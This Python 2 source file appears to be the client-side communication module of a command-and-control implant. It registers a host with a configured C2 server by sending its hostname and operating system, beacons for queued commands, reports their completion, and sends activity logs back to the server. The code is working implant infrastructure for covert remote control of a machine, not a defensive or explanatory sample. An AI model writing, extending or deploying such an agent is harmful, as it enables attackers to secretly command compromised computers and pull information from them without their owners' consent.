import json
from socket import gethostname
from sys import platform

from .settings import *
from .lib.decorators import Request
from .db.SQLite import Helper


class Rester():
    def __init__(self):
        self.db = Helper()
        self.fetch = Request(self.db.get_config('c2_host'), port=int(self.db.get_config('c2_port')),
                             ssl=self.db.get_config('ssl'))

    def register(self):
        data = {
            "name": gethostname(),
            "os": platform,
        }

        uuid = self.db.get_config('uuid')
        if uuid:
            data['uuid'] = uuid

        @self.fetch('/api/agents/', proto="POST", data=data)
        def handle(resp):
            resp_json = json.loads(resp)
            self.db.set_config('uuid', resp_json['uuid'])
        handle()

    def beacon(self):
        @self.fetch('/api/commands/%s/' % self.db.get_config('uuid'))
        def handle(resp):
            return json.loads(resp)
        return handle()

    def commandComplete(self, command_id):
        @self.fetch('/api/complete/', proto="POST", data={'uuid': self.db.get_config('uuid'), 'command_id': command_id})
        def handle(resp):
            return json.loads(resp)
        return handle()

    def log(self, message, type):
        @self.fetch('/api/log/', proto="POST", data={'uuid': self.db.get_config('uuid'), 'message': message, 'type': type})
        def handle(resp):
            return json.loads(resp)
        return handle()

    def log_event(self, message):
        print "[*] Event: %s" % message
        self.log(message, 'event')

    def log_action(self, message):
        print "[+] Action: %s" % message
        self.log(message, 'action')

    def log_error(self, message):
        print "[-] Error: %s" % message
        self.log(message, 'error')
